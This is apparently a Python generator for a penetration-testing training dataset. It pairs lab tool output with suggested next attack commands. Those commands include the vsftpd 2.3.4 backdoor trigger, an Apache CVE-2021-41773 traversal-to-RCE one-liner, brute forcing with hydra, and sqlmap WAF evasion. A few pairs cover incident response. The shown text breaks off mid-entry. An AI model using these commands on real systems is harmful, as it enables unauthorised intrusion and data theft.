"""
Generate the Lane-A "terminal reading" skill dataset: given a messy block of real
tool output (nmap, hydra, sqlmap, gobuster, msfconsole, smbclient, curl, auth.log,
responder, john/hashcat), Eli must (1) decide what matters, and (2) name the next
command. This is Lane A skill #1 — the model has to read the output *and* pick the
correct next step, not just print the output back.

Output (Alpaca):
  - processed/training-data-cyber-terminal-reading.jsonl

Every offensive pair is authorization-framed with an explicit `[scope: authorized]`
header and only ever targets the reserved lab ranges
10.10.0.0/24 / 192.168.1.0/24 / 203.0.113.0/24 (RFC 5737 TEST-NET-3).
"""

from pathlib import Path
import json
import random
import re
import uuid
from typing import List, Dict, Any

try:
    from config import ROOT, RAW, PROCESSED, DATA
except ImportError:
    ROOT = Path(__file__).resolve().parent.parent
    RAW = ROOT / "raw"
    PROCESSED = ROOT / "processed"
    DATA = ROOT / "data"

SAFE_NET_PREFIXES = ("10.10.0.", "192.168.1.", "203.0.113.")
_IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")


def sanitize_target(text: str) -> str:
    """Rewrite any IPv4 outside the reserved lab/test ranges to 10.10.0.5."""
    if not isinstance(text, str):
        return text

    def _repl(match: "re.Match") -> str:
        ip = match.group(0)
        if any(ip.startswith(p) for p in SAFE_NET_PREFIXES):
            return ip
        return "10.10.0.5"

    return _IPV4_RE.sub(_repl, text)

# --------------------------------------------------------------------------- #
# TOOL_OUTPUT_TEMPLATES
# 29 curated tool-output -> "what matters + next command" pairs.
#   instruction : the messy tool output the model is handed (authorization-framed)
#   output      : think + what matters + next command  (mirrors the spec example)
#   tool / case / cve : metadata
# --------------------------------------------------------------------------- #
TOOL_OUTPUT_TEMPLATES: List[Dict[str, Any]] = [
    # ------------------------- nmap -sV (5 cases) ------------------------- #
    {
        "tool": "nmap", "case": "clean",
        "instruction": (
            "[scope: authorized] I ran `nmap -sV 10.10.0.5`:\n\n"
            "PORT    STATE SERVICE VERSION\n"
            "22/tcp  open  ssh     OpenSSH 8.2p1\n"
            "80/tcp  open  http    Apache httpd 2.4.41\n"
            "443/tcp open  ssl/http Apache httpd 2.4.41\n\n"
            "What's interesting here and what should I check?"
        ),
        "output": (
            " thinking\n"
            "1. Modern versions across the board: OpenSSH 8.2p1 and Apache 2.4.41 both have "
            "patched minor releases, so nothing screams 'known unauth RCE'.\n"
            "2. The web stack is the biggest attack surface - two exposed Apache listeners.\n"
            "3. No interesting low ports, so enumerating the web app is the fastest win.\n"
            " response\n\n"
            "**Priority**: the Apache web services. Fingerprint the app behind 80/443 and "
            "look for exposed admin/hidden paths:\n\n"
            "```bash\n"
            "curl -s -I http://10.10.0.5/ && gobuster dir -u http://10.10.0.5 -w /usr/share/wordlists/dirb/common.txt -t 50\n"
            "```\n\n"
            "Between tasks, queue a banner + TLS check too."
        ),
        "cve": [],
    },
    {
        "tool": "nmap", "case": "vulnerabilities",
        "instruction": (
            "[scope: authorized] I ran `nmap -sV 10.10.0.5`:\n\n"
            "PORT    STATE SERVICE VERSION\n"
            "22/tcp  open  ssh     OpenSSH 7.6p1\n"
            "80/tcp  open  http    Apache httpd 2.4.49\n"
            "445/tcp open  microsoft-ds Samba 4.6.2\n\n"
            "What's interesting here and what should I check?"
        ),
        "output": (
            " thinking\n"
            "1. Apache 2.4.49 = CVE-2021-41773 (path traversal/RCE) - highest priority.\n"
            "2. Samba 4.6.2 = outdated, check for CVE-2017-0144 (EternalBlue if Windows behind "
            "it), null sessions.\n"
            "3. OpenSSH 7.6p1 - no critical unauth RCEs, skip for now.\n"
            " response\n\n"
            "**Priority**: Apache 2.4.49. Check if `/cgi-bin/` is exposed:\n\n"
            "```bash\n"
            "curl -s --path-as-is \"http://10.10.0.5/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd\"\n"
            "```\n"
            "Between tasks, queue: `smbclient -L //10.10.0.5 -N` for share enumeration."
        ),
        "cve": ["CVE-2021-41773", "CVE-2017-0144"],
    },

    {
        "tool": "nmap", "case": "filtered_ports",
        "instruction": (
            "[scope: authorized] I ran `nmap -sV 10.10.0.5`:\n\n"
            "PORT     STATE    SERVICE VERSION\n"
            "22/tcp   filtered ssh\n"
            "80/tcp   filtered http\n"
            "443/tcp  filtered ssl/http\n\n"
            "Nmap done: 1 IP address scanned.\n\n"
            "What's interesting here and what should I check?"
        ),
        "output": (
            " thinking\n"
            "1. Three filtered ports on the *same three* services = a host firewall / iptables "
            "actively dropping, not closing, inbound.\n"
            "2. Because it's filtered (not closed), the services are likely up but only reachable "
            "from an allowed source.\n"
            "3. I should confirm the filter and probe from a 'trusted' vantage (the pivot box).\n"
            " response\n\n"
            "**Priority**: confirm the firewall and rerun from inside the network - the services "
            "are probably live but source-filtered:\n\n"
            "```bash\n"
            "nmap -sS -p- -Pn --source-port 53 10.10.0.5   # or via pivoted host\n"
            "```\n\n"
            "Between tasks, try `-sS -Pn -p22,80,443` from the foothold box to map real exposure."
        ),
        "cve": [],
    },
    {
        "tool": "nmap", "case": "udp",
        "instruction": (
            "[scope: authorized] I ran `nmap -sU -p 53,123,161 10.10.0.5`:\n\n"
            "PORT     STATE         SERVICE VERSION\n"
            "53/udp   open|filtered domain\n"
            "123/udp  open|filtered ntp\n"
            "161/udp  open|filtered snmp\n\n"
            "What's interesting here and what should I check?"
        ),
        "output": (
            " thinking\n"
            "1. `open|filtered` is the default for UDP when there's no ICMP port-unreachable - "
            "most of these are inconclusive.\n"
            "2. SNMP 161 is the juiciest: an open community string (`public`) can dump the whole "
            "host config.\n"
            "3. NTP just adds host-info leak risk; DNS is only worth it if it's an AXFR target.\n"
            " response\n\n"
            "**Priority**: confirm SNMP and brute the community string:\n\n"
            "```bash\n"
            "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.0.5 && snmpwalk -v2c -c public 10.10.0.5\n"
            "```\n\n"
            "Between tasks, check `dnsrecon -a -d example.lab -n 10.10.0.5` only if the box runs DNS."
        ),
        "cve": [],
    },
    {
        "tool": "nmap", "case": "service_heavy",
        "instruction": (
            "[scope: authorized] I ran `nmap -sV 10.10.0.5`:\n\n"
            "PORT     STATE SERVICE VERSION\n"
            "21/tcp   open  ftp     vsftpd 2.3.4\n"
            "22/tcp   open  ssh     OpenSSH 7.6p1\n"
            "80/tcp   open  http    Apache httpd 2.4.18\n"
            "3306/tcp open  mysql   MySQL 5.5.60\n"
            "445/tcp  open  samba   Samba smbd 4.6.2\n\n"
            "What's interesting here and what should I check?"
        ),
        "output": (
            " thinking\n"
            "1. vsftpd 2.3.4 = CVE-2011-2523 backdoor - an instant, well-known foothold.\n"
            "2. Everything here is ancient (Apache 2.4.18, MySQL 5.5.60) - likely one box with "
            "years of unpatch depth.\n"
            "3. DB exposed is a bonus for post-exploitation, but only after I get a shell.\n"
            " response\n\n"
            "**Priority**: vsftpd 2.3.4. Trigger the backdoor and grab the bind shell:\n\n"
            "```bash\n"
            "echo -e 'USER :)\\nPASS x' | nc 10.10.0.5 21 && nc 10.10.0.5 6200\n"
            "```\n\n"
            "Between tasks, queue `searchsploit vsftpd 2.3.4` and enumerate the SMB share set."
        ),
        "cve": ["CVE-2011-2523"],
    },

    # ------------------------- hydra (3 cases) ------------------------- #
    {
        "tool": "hydra", "case": "success",
        "instruction": (
            "[scope: authorized] I ran `hydra -l admin -P rockyou.txt ssh://10.10.0.5` and got:\n\n"
            "[22][ssh] host: 10.10.0.5   login: admin   password: password1\n"
            "1 of 1 target successfully completed, 1 valid password found\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. Valid credentials found - don't rush; note the account 'admin' because it often "
            "owns the box or maps to a web panel too.\n"
            "2. First move is a low-noise login to avoid lockout, then session is live.\n"
            "3. Credential reuse: the same password may work on the web app / MySQL.\n"
            " response\n\n"
            "**Priority**: log in once and check privilege + password reuse:\n\n"
            "```bash\n"
            "sshpass -p 'password1' ssh admin@10.10.0.5 'id; sudo -l' && hydra -l admin -p password1 ftp://10.10.0.5\n"
            "```\n\n"
            "Between tasks, queue `crackmapexec smb 10.10.0.5 -u admin -p password1` for lateral check."
        ),
        "cve": [],
    },
    {
        "tool": "hydra", "case": "fail",
        "instruction": (
            "[scope: authorized] I ran `hydra -l admin -P rockyou.txt ssh://10.10.0.5` and got:\n\n"
            "Hydra v9.2 Running against 10.10.0.5\n"
            "[22][ssh] host: 10.10.0.5   login: admin   password: 123456   (account locked)\n"
            "[22][ssh] host: 10.10.0.5   login: admin   password: 654321   (account locked)\n"
            "0 of 1 target successfully completed\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. 'account locked' after bad guesses = account lockout policy; I'm burning the box.\n"
            "2. Stop hammering SSH immediately - brute forcing further will lock out real users "
            "and trip detection.\n"
            "3. Enumerate a valid username set first, or hit a service without lockout (web login).\n"
            " response\n\n"
            "**Priority**: stop and pivot to a lockout-safe target:\n\n"
            "```bash\n"
            "hydra -L users.txt -P rockyou.txt http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\" -t 4\n"
            "```\n\n"
            "Between tasks, `enum4linux -U 10.10.0.5` to harvest real usernames for a smarter list."
        ),
        "cve": [],
    },
    {
        "tool": "hydra", "case": "rate_limited",
        "instruction": (
            "[scope: authorized] I ran `hydra -l admin -P rockyou.txt ssh://10.10.0.5` and got:\n\n"
            "[ERROR] target ssh://10.10.0.5:22/ login: admin password: pass - child process did not "
            "complete in time (timeout), aborting 12 attempts\n"
            "[ERROR] Too many connection timeout errors, sleeping 60\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. Timeouts + forced sleep = the box (or a proxy/fail2ban) is rate-limiting me.\n"
            "2. Pushing harder just makes it worse and burns the target; slow is the only way.\n"
            "3. Reduced concurrency with delays keeps the run alive.\n"
            " response\n\n"
            "**Priority**: slow the attack to a polite pace:\n\n"
            "```bash\n"
            "hydra -l admin -P rockyou.txt -t 1 -w 5 -f ssh://10.10.0.5\n"
            "```\n\n"
            "Between tasks, split the wordlist with `-o` chunk files and interleave other checks."
        ),
        "cve": [],
    },

    # ------------------------- sqlmap --dump (3 cases) ------------------------- #
    {
        "tool": "sqlmap", "case": "found_db",
        "instruction": (
            "[scope: authorized] I ran `sqlmap -u 'http://10.10.0.5/item?id=12' --batch --dump` and got:\n\n"
            "Parameter: id (GET)\n"
            "    Type: boolean-based blind\n"
            "    Payload: id=12 AND 1=1\n"
            "back-end DBMS: MySQL >= 5.0.0\n"
            "Database: shop\n"
            "Table: users [2 columns]\n"
            "+-------+----------+\n"
            "| id    | password |\n"
            "+-------+----------+\n"
            "| 1     | b23f...  |\n"
            "| 42    | 9a11...  |\n"
            "+-------+----------+\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. The dump confirms boolean-based blind SQLi and returned hashed passwords.\n"
            "2. Hashes, not plaintext - so crack them offline rather than re-querying the DB.\n"
            "3. Also look for more tables (sessions, config) that may hold keys or other creds.\n"
            " response\n\n"
            "**Priority**: crack the captured hashes and enumerate the rest of the schema:\n\n"
            "```bash\n"
            "sqlmap -u 'http://10.10.0.5/item?id=12' --batch --tables --dbms mysql && echo hashes > /tmp/hashes.txt && john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt\n"
            "```\n\n"
            "Between tasks, check a config table (`--dump -T config`) for hardcoded secrets."
        ),
        "cve": [],
    },
    {
        "tool": "sqlmap", "case": "syntax_error",
        "instruction": (
            "[scope: authorized] I ran `sqlmap -u 'http://10.10.0.5/item?id=12' --batch` and got:\n\n"
            "[CRITICAL] unable to connect to the target URL: "
            "requests.exceptions.InvalidURL: Failed to parse: http://10.10.0.5//item?id=12\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. The double slash in the path means the URL got mangled (bad quoting or a trailing "
            "path join) - sqlmap never even reached the server.\n"
            "2. Not a WAF or injection failure - a client-side URL parse error.\n"
            "3. Re-test the request manually with curl to confirm the target parses.\n"
            " response\n\n"
            "**Priority**: verify the URL is well-formed before re-running:\n\n"
            "```bash\n"
            "curl -s -o /dev/null -w '%{http_code}' 'http://10.10.0.5/item?id=12' && sqlmap -u 'http://10.10.0.5/item?id=12' --batch --level 2\n"
            "```\n\n"
            "Between tasks, capture the real request with a proxy/Burp and feed it via `-r request.txt`."
        ),
        "cve": [],
    },
    {
        "tool": "sqlmap", "case": "waf_detected",
        "instruction": (
            "[scope: authorized] I ran `sqlmap -u 'http://10.10.0.5/item?id=12' --batch` and got:\n\n"
            "[INFO] testing connection to the target URL\n"
            "[WARNING] heuristic (basic) test showed that the target URL might be behind a WAF\n"
            "[WARNING] the target URL content is malformed (likely due to abnormal response)\n"
            "[ERROR] not possible to automatically detect the WAF type\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. WAF detected and not auto-identified - straight payloads will be blocked.\n"
            "2. I need to fingerprint the WAF, then route through tamper scripts to dodge it.\n"
            "3. Abnormal responses confirm filtering, not a dead endpoint.\n"
            " response\n\n"
            "**Priority**: fingerprint the WAF and retry with tamper evasion:\n\n"
            "```bash\n"
            "wafw00f http://10.10.0.5 && sqlmap -u 'http://10.10.0.5/item?id=12' --batch --tamper=space2comment,randomcase --random-agent\n"
            "```\n\n"
            "Between tasks, try the same injection on a non-WAF'd subdomain/asset if one exists."
        ),
        "cve": [],
    },

    # ------------------------- gobuster (3 cases) ------------------------- #
    {
        "tool": "gobuster", "case": "found_admin",
        "instruction": (
            "[scope: authorized] I ran `gobuster dir -u http://10.10.0.5 -w /usr/share/wordlists/dirb/common.txt` and got:\n\n"
            "/admin                (Status: 200) [Size: 1421]\n"
            "/login                (Status: 200) [Size: 2333]\n"
            "/backup.zip           (Status: 200) [Size: 45123]\n"
            "/uploads              (Status: 301) [Size: 178]\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. `/backup.zip` (45 KB) is the standout - source/config archives often leak secrets.\n"
            "2. `/admin` and `/login` are live app pages to poke at auth.\n"
            "3. `/uploads` (301) suggests file upload/storage - a classic RCE landing spot.\n"
            " response\n\n"
            "**Priority**: pull and inspect the backup archive, then probe the upload endpoint:\n\n"
            "```bash\n"
            "wget http://10.10.0.5/backup.zip -O /tmp/backup.zip && mkdir /tmp/bk && cd /tmp/bk && unzip ../backup.zip && grep -rE 'pass|key|secret|token' .\n"
            "```\n\n"
            "Between tasks, test `/uploads` for arbitrary file upload with `.php`/`.jsp` payloads."
        ),
        "cve": [],
    },
    {
        "tool": "gobuster", "case": "only_403",
        "instruction": (
            "[scope: authorized] I ran `gobuster dir -u http://10.10.0.5 -w /usr/share/wordlists/dirb/common.txt` and got:\n\n"
            "/admin                (Status: 403)\n"
            "/config               (Status: 403)\n"
            "/server-status        (Status: 403)\n"
            "/wp-admin             (Status: 403)\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. A wall of 403s is *informative*, not a dead end - the server is hiding real dirs.\n"
            "2. 403 usually means the path exists but is access-controlled.\n"
            "3. Try verb tampering (GET->POST, X-Original-URL) and different wordlists for hidden "
            "subdirectories.\n"
            " response\n\n"
            "**Priority**: defeat the access control with verb/path tampering:\n\n"
            "```bash\n"
            "curl -s -o /dev/null -w '%{http_code}\\n' -X POST http://10.10.0.5/admin && curl -s -H 'X-Original-URL: /admin' http://10.10.0.5/\n"
            "```\n\n"
            "Between tasks, run ffuf with a bigger list and `-fc 403` to surface non-403 hits."
        ),
        "cve": [],
    },
    {
        "tool": "gobuster", "case": "wildcard_false_positives",
        "instruction": (
            "[scope: authorized] I ran `gobuster dir -u http://10.10.0.5 -w /usr/share/wordlists/dirb/common.txt` and got:\n\n"
            "/foo                  (Status: 200) [Size: 2718]\n"
            "/xyz123               (Status: 200) [Size: 2718]\n"
            "/qqqzzz               (Status: 200) [Size: 2718]\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. Identical 200 size (2718) on nonsense names like /xyz123 = wildcard catch-all "
            "returning the SPA index - classic false positives.\n"
            "2. gobuster didn't filter the wildcard, so I'm drowning in junk.\n"
            "3. Re-run with wildcard exclusion enabled to get real endpoints.\n"
            " response\n\n"
            "**Priority**: re-run with wildcard suppression so only real paths surface:\n\n"
            "```bash\n"
            "ffuf -u http://10.10.0.5/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac -fc 200 -s\n"
            "```\n\n"
            "Between tasks, diff response sizes to confirm which 'hits' actually change content."
        ),
        "cve": [],
    },

    # ------------------------- msfconsole search (3 cases) ------------------------- #
    {
        "tool": "msfconsole", "case": "modules_found",
        "instruction": (
            "[scope: authorized] I ran `msfconsole -q -x 'search vsftpd 2.3.4'` and got:\n\n"
            "Matching Modules\n"
            "================\n"
            "   #  Name                                          Disclosure  Rank       Check?\n"
            "   0  exploit/unix/ftp/vsftpd_234_backdoor            2011-06-30  excellent  Yes\n"
            "   1  auxiliary/scanner/ftp/ftp_version               2011-01-01  normal     No\n"
            "   2  exploit/multi/http/apache_mod_cgi_bash_env_exec 2014-09-24  excellent  Yes\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. `exploit/unix/ftp/vsftpd_234_backdoor` is the exact match for the target service, "
            "ranked excellent with a `check` method.\n"
            "2. The vsftpd module matches the version fingerprint - fastest reliable foothold.\n"
            "3. apache_mod_cgi is a different vector; only relevant if I don't reach FTP.\n"
            " response\n\n"
            "**Priority**: confirm the module's `check` against the lab host, then use it:\n\n"
            "```bash\n"
            "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.10.0.5; check'\n"
            "```\n\n"
            "Between tasks, note `ftp_version` as a low-noise recon auxiliary."
        ),
        "cve": ["CVE-2011-2523"],
    },
    {
        "tool": "msfconsole", "case": "no_modules",
        "instruction": (
            "[scope: authorized] I ran `msfconsole -q -x 'search OpenSSH 7.6p1'` and got:\n\n"
            "Matching Modules\n"
            "================\n"
            "   No results found\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. No MSF module for OpenSSH 7.6p1 - and that's expected: it has no reliable unauth RCE.\n"
            "2. Don't force it; pick a better attack surface on the same box.\n"
            "3. Keep the search broad (e.g., `ssh`) in case a generic auxiliary applies.\n"
            " response\n\n"
            "**Priority**: widen the search and refocus on an actually-exposed service:\n\n"
            "```bash\n"
            "msfconsole -q -x 'search ssh' && nmap -sV 10.10.0.5 | grep -iE 'open|http|ftp|smb'\n"
            "```\n\n"
            "Between tasks, run `auxiliary/scanner/ssh/ssh_login` for a lockout-safe credential check."
        ),
        "cve": [],
    },
    {
        "tool": "msfconsole", "case": "module_check",
        "instruction": (
            "[scope: authorized] I ran `msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.10.0.5; check'` and got:\n\n"
            "[*] 10.10.0.5:21 - The target service is running, but could not be validated.\n"
            "[*] Check failed: The target may not be vulnerable, or detection is unreliable.\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. `check` couldn't confirm - unreliable detection, not proof of safety.\n"
            "2. The backdoor only triggers with the exact smiley USER string; a manual probe is "
            "decisive where the module check is not.\n"
            "3. One manual connection is low-risk and gives a definitive answer.\n"
            " response\n\n"
            "**Priority**: probe manually since `check` was inconclusive:\n\n"
            "```bash\n"
            "echo -e 'USER :)\\nPASS x' | nc -w 5 10.10.0.5 21 && nc -w 3 10.10.0.5 6200\n"
            "```\n\n"
            "Between tasks, confirm the FTP banner version with `nc` if the service is reachable."
        ),
        "cve": ["CVE-2011-2523"],
    },

    # ------------------------- smbclient -L (3 cases) ------------------------- #
    {
        "tool": "smbclient", "case": "anonymous_shares",
        "instruction": (
            "[scope: authorized] I ran `smbclient -L //10.10.0.5 -N` and got:\n\n"
            "\tSharename       Type      Comment\n"
            "\t--------        ----      -------\n"
            "\tUsers           Disk      Public user shares\n"
            "\tBackups         Disk      Daily dumps\n"
            "\tprint$          Printer   Printer Drivers\n"
            "\tIPC$            IPC       IPC Service\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. Null-session listing worked - meaningfully exposed shares with names full of "
            "intel (Users, Backups).\n"
            "2. `Backups` screams credential/history dumps - highest value target.\n"
            "3. Anonymous access means I can likely browse and read without auth yet.\n"
            " response\n\n"
            "**Priority**: connect and enumerate the `Backups` share:\n\n"
            "```bash\n"
            "smbclient //10.10.0.5/Backups -N -c 'recurse; lcd /tmp; prompt; mget *' 2>/dev/null; ls /tmp\n"
            "```\n\n"
            "Between tasks, check `Users` for readable profile files with `smbclient //10.10.0.5/Users -N`."
        ),
        "cve": [],
    },
    {
        "tool": "smbclient", "case": "restricted",
        "instruction": (
            "[scope: authorized] I ran `smbclient -L //10.10.0.5 -N` and got:\n\n"
            "tree connect failed: NT_STATUS_ACCESS_DENIED\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. ACCESS_DENIED on null session = guest/anonymous is disabled or restricted.\n"
            "2. I need real credentials or a known username to enumerate shares.\n"
            "3. Username enumeration over SMB (or a quick password spray on a discovered user) is "
            "the lever.\n"
            " response\n\n"
            "**Priority**: establish a valid session before share enumeration:\n\n"
            "```bash\n"
            "enum4linux -U 10.10.0.5 && crackmapexec smb 10.10.0.5 -u '' -p '' --shares\n"
            "```\n\n"
            "Between tasks, gather usernames via `rpcclient -U '' -N 10.10.0.5 enumdomusers`."
        ),
        "cve": [],
    },
    {
        "tool": "smbclient", "case": "connection_refused",
        "instruction": (
            "[scope: authorized] I ran `smbclient -L //10.10.0.5 -N` and got:\n\n"
            "Connection to 10.10.0.5 failed (Error NT_STATUS_CONNECTION_REFUSED)\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. CONNECTION_REFUSED = no SMB listener at all (SMB service off, or port blocked at "
            "the app layer).\n"
            "2. The earlier scan may have been wrong about 445, or it's filtered.\n"
            "3. Don't keep retrying; re-verify the port actually reaches the box.\n"
            " response\n\n"
            "**Priority**: re-check whether 445 is truly open:\n\n"
            "```bash\n"
            "nmap -Pn -p445 --open 10.10.0.5 && nc -vz -w 3 10.10.0.5 445\n"
            "```\n\n"
            "Between tasks, if 445 is dead, focus on the web/ssh surface instead of SMB."
        ),
        "cve": [],
    },

    # ------------------------- curl -v on Apache 2.4.49 (3 cases) ------------------------- #
    {
        "tool": "curl", "case": "path_traversal_success",
        "instruction": (
            "[scope: authorized] I ran `curl -v --path-as-is "
            "'http://10.10.0.5/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'` and got:\n\n"
            "> GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1\n"
            "> Host: 10.10.0.5\n"
            "< HTTP/1.1 200 OK\n"
            "< Server: Apache/2.4.49 (Unix)\n"
            "root:x:0:0:root:/root:/bin/bash\n"
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. HTTP 200 with /etc/passwd contents = confirmed CVE-2021-41773 path traversal.\n"
            "2. The version banner (Apache/2.4.49) matches exactly.\n"
            "3. Read-only file read is nice, but I want RCE - same flaw gives remote command "
            "execution via a crafted POST.\n"
            " response\n\n"
            "**Priority**: escalate the confirmed traversal to RCE:\n\n"
            "```bash\n"
            "curl -s --path-as-is -X POST 'http://10.10.0.5/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo; id'\n"
            "```\n\n"
            "Between tasks, patch/audit: upgrade to Apache >= 2.4.50 and disable cgi-bin if unused."
        ),
        "cve": ["CVE-2021-41773"],
    },
    {
        "tool": "curl", "case": "path_traversal_blocked",
        "instruction": (
            "[scope: authorized] I ran `curl -v --path-as-is "
            "'http://10.10.0.5/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'` and got:\n\n"
            "> GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1\n"
            "< HTTP/1.1 403 Forbidden\n"
            "< Server: Apache/2.4.49 (Unix)\n"
            "< Content-Length: 15\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. 403 on the canonical traversal - the server rejects the encoded-dot pattern "
            "(this is what a patched/2.4.50+ or hardened config does).\n"
            "2. Version still says 2.4.49 but the endpoint resists the exact PoC.\n"
            "3. Try alternate encodings (double URL-encode, /./, ..\\ for Windows) before moving on.\n"
            " response\n\n"
            "**Priority**: vary the encoding since the canonical payload is filtered:\n\n"
            "```bash\n"
            "for p in 'cgi-bin/.%252e%252e%252f%252e%252e%252fetc/passwd' 'cgi-bin/..%2f..%2f..%2fetc/passwd'; do curl -s -o /dev/null -w \"%{http_code} $p\\n\" --path-as-is \"http://10.10.0.5/$p\"; done\n"
            "```\n\n"
            "Between tasks, try the same on `/icons/` if a second alias is configured."
        ),
        "cve": ["CVE-2021-41773"],
    },
    {
        "tool": "curl", "case": "not_vulnerable",
        "instruction": (
            "[scope: authorized] I ran `curl -v --path-as-is "
            "'http://10.10.0.5/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'` and got:\n\n"
            "< HTTP/1.1 404 Not Found\n"
            "< Server: Apache/2.4.49 (Unix)\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. A 404 (not 403 or 200) means the path resolves but there's no readable resource "
            "at the traversal destination - likely cgi-bin isn't mounted as an alias.\n"
            "2. The version string *looks* vulnerable but the configuration isn't exploitable "
            "through this path.\n"
            "3. Confirm by probing a direct static file to validate my visibility, then pivot.\n"
            " response\n\n"
            "**Priority**: confirm reachability, then move to the real attack surface:\n\n"
            "```bash\n"
            "curl -s -o /dev/null -w '%{http_code}\\n' http://10.10.0.5/ && gobuster dir -u http://10.10.0.5 -w /usr/share/wordlists/dirb/common.txt -x php,html,zip\n"
            "```\n\n"
            "Between tasks, still plan the Apache upgrade (2.4.49 -> 2.4.50+) as hygiene."
        ),
        "cve": ["CVE-2021-41773"],
    },

    # ------------------------- /var/log/auth.log (3 cases) ------------------------- #
    {
        "tool": "auth.log", "case": "brute_plus_success",
        "instruction": (
            "[scope: authorized] I was given read access to 10.10.0.5's log and see:\n\n"
            "Apr 12 02:11:01 sshd[1234]: Failed password for root from 203.0.113.9 port 50122 ssh2\n"
            "Apr 12 02:11:04 sshd[1234]: Failed password for root from 203.0.113.9 port 50124 ssh2\n"
            "Apr 12 02:12:50 sshd[2391]: Accepted password for root from 203.0.113.9 port 50911 ssh2\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. A successful root login right after repeated failures = the attacker cracked it.\n"
            "2. That's a confirmed compromise, not just a scan - assume the box is owned.\n"
            "3. Response priority: IMMEDIATE containment - kill session, rotate root password, "
            "pull forensic triage, check persistence.\n"
            " response\n\n"
            "**Priority**: contain the confirmed intrusion first, then preserve evidence:\n\n"
            "```bash\n"
            "sudo pkill -u <attacker-acct> ; sudo passwd root ; sudo last -n 20; grep Accepted /var/log/auth.log | tail\n"
            "```\n\n"
            "Between tasks, snapshot `/etc/passwd`, `~/.ssh/authorized_keys`, and crontabs for persistence."
        ),
        "cve": [],
    },
    {
        "tool": "auth.log", "case": "failed_only",
        "instruction": (
            "[scope: authorized] I was given read access to 10.10.0.5's log and see:\n\n"
            "Apr 12 01:00:03 sshd[101]: Failed password for admin from 10.10.0.9 port 50012 ssh2\n"
            "Apr 12 01:00:05 sshd[102]: Failed password for admin from 10.10.0.9 port 50014 ssh2\n"
            "Apr 12 01:02:20 sshd[133]: Failed password for bob from 10.10.0.9 port 50040 ssh2\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. Only failed attempts, no successful login - a brute-force / dictionary barrage "
            "in progress, not (yet) a breach.\n"
            "2. Multiple usernames targeted means the attacker is spraying, not chaining one cred.\n"
            "3. Action: block the source, verify no success anywhere, enforce rate limiting.\n"
            " response\n\n"
            "**Priority**: block the source and confirm there was no earlier success:\n\n"
            "```bash\n"
            "sudo ss -tlnp 'sport = :22'; sudo iptables -A INPUT -s 10.10.0.9 -j DROP; grep -c 'Accepted' /var/log/auth.log\n"
            "```\n\n"
            "Between tasks, enable fail2ban and require key-only auth for SSH."
        ),
        "cve": [],
    },
    {
        "tool": "auth.log", "case": "key_based",
        "instruction": (
            "[scope: authorized] I was given read access to 10.10.0.5's log and see:\n\n"
            "Apr 12 03:00:01 sshd[9001]: Accepted publickey for deploy from 192.168.1.22 port 50010 ssh2: RSA SHA256:ab12...\n"
            "Apr 12 04:00:01 sshd[9002]: Accepted publickey for deploy from 192.168.1.22 port 50012 ssh2: RSA SHA256:ab12...\n\n"
            "What matters here and what should I do next?"
        ),
        "output": (
            " thinking\n"
            "1. Key-based logins from a single trusted host at exactly hourly intervals = "
            "scheduled automation (backup/cron), not an intrusion.\n"
            "2. No password attempts and a consistent internal source = healthy.\n"
            "3. Still worth confirming the key is expected and rotates.\n"
            " response\n\n"
            "**Priority**: verify the key is legitimate and pinned to the right host:\n\n"
            "```bash\n"
            "sudo grep -A2 'Accepted publickey' /var/log/auth.log | head; sudo ssh-keygen -lf ~/.ssh/authorized_keys\n"
            "```\n\n"
            "Between tasks, cross-check the fingerprint against the deploy server's authorized_keys."
        ),
        "cve": [],
    },

    # ------------------------- responder (1 case) ------------------------- #
    {
        "tool": "responder", "case": "hash_capture",
        "instruction": (
            "[scope: authorized] In my lab engagement I ran `responder -I eth0` and got:\n\n"
            "[+] Listening for events...\n"
            "[+] [NBT-NS] Poisoned answer sent to 10.10.0.8   for name WORKGROUP [WORKGROUP]\n"
